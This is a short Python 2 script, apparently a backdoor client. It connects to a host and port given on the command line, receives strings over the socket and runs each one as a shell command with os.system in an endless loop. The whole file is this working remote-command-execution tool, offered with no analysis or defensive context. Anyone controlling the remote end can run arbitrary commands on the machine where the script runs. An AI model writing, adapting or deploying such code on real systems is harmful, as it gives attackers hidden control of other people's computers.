# -*- coding: utf-8 -*-
import argparse
import socket
import time
import os
def connectHost(ht,pt):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ht,int(pt)))
    while True:
        data = sock.recv(1024)
        data = data.decode('utf-8')
        print data
        os.system(data)

        sock.send('client got'.encode('utf-8'))
        time.sleep(1)
    sock.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H',dest='hostName',help='Host Name')
    parser.add_argument('-p',dest='conPort',help='Port')
    args = parser.parse_args()
    print args
    host = args.hostName
    port = args.conPort

    if host == None and port ==None:
        print parser.parse_args(['-h'])
        exit(0)
    connectHost(host,port)



if __name__ == '__main__':
    main()